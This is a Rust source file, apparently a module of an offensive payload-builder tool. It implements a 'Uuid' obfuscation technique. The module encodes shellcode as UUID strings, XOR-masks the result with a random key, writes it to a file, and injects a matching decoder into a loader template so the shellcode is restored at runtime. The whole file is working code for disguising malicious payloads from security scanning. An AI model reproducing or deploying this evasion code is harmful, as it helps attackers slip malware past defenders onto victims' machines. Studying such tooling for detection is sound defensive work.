use crate::techniques::{BuildContext, Technique, TechniqueMeta};
use std::fs;

pub struct Uuid;

impl Technique for Uuid {
    fn meta(&self) -> &'static TechniqueMeta { &UUID_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        let shellcode = fs::read(ctx.shellcode_path)
            .map_err(|e| anyhow::anyhow!("read shellcode: {e}"))?;
        let original_len = shellcode.len();
        let encoded = uuid_encode(&shellcode);

        let xor_key: u8 = loop {
            let k = (ctx.polymorph.random_u64() & 0xFF) as u8;
            if k != 0 { break k; }
        };
        let masked: Vec<u8> = encoded.bytes().map(|b| b ^ xor_key).collect();

        let out_path = ctx.src_dir.join("input.uuid");
        fs::write(&out_path, &masked)
            .map_err(|e| anyhow::anyhow!("write input.uuid: {e}"))?;

        let decryption_function = "fn unmask(buf: &mut Vec<u8>, key: u8) { for b in buf.iter_mut() { *b ^= key; } }
fn hex_to_byte(h: u8, l: u8) -> u8 {
    fn val(c: u8) -> u8 { match c { b'0'..=b'9' => c - b'0', b'a'..=b'f' => c - b'a' + 10, b'A'..=b'F' => c - b'A' + 10, _ => 0 } }
    (val(h) << 4) | val(l)
}
fn uuid_decode(buf: &[u8]) -> Vec<u8> {
    let mut result = Vec::new();
    let mut i = 0;
    while i < buf.len() {
        if buf[i] == b'-' || buf[i] == b'\\n' || buf[i] == b'\\r' { i += 1; continue; }
        if i + 1 < buf.len() { result.push(hex_to_byte(buf[i], buf[i+1])); i += 2; } else { break; }
    }
    result
}".to_string();

        ctx.set_replacement("{{PATH_TO_SHELLCODE}}", "\"input.uuid\"".to_string());
        ctx.set_replacement("{{DECRYPTION_FUNCTION}}", decryption_function);
        ctx.set_replacement("{{MAIN}}", format!(
            "unmask(&mut vec, 0x{:02x});\n    vec = uuid_decode(&vec);\n    vec.truncate({});",
            xor_key, original_len
        ));
        ctx.set_replacement("{{DEPENDENCIES}}", String::new());
        ctx.set_replacement("{{IMPORTS}}", String::new());
        Ok(())
    }
}

fn bytes_to_uuid(chunk: &[u8; 16]) -> String {
    format!(
        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        chunk[0], chunk[1], chunk[2], chunk[3],
        chunk[4], chunk[5], chunk[6], chunk[7],
        chunk[8], chunk[9], chunk[10], chunk[11],
        chunk[12], chunk[13], chunk[14], chunk[15]
    )
}

fn uuid_encode(shellcode: &[u8]) -> String {
    let mut padded = shellcode.to_vec();
    let remainder = padded.len() % 16;
    if remainder != 0 { padded.resize(padded.len() + (16 - remainder), 0); }
    padded.chunks_exact(16)
        .map(|chunk| { let arr: [u8; 16] = chunk.try_into().unwrap(); bytes_to_uuid(&arr) })
        .collect::<Vec<String>>()
        .join("\n")
}

pub use super::super::UUID_META;
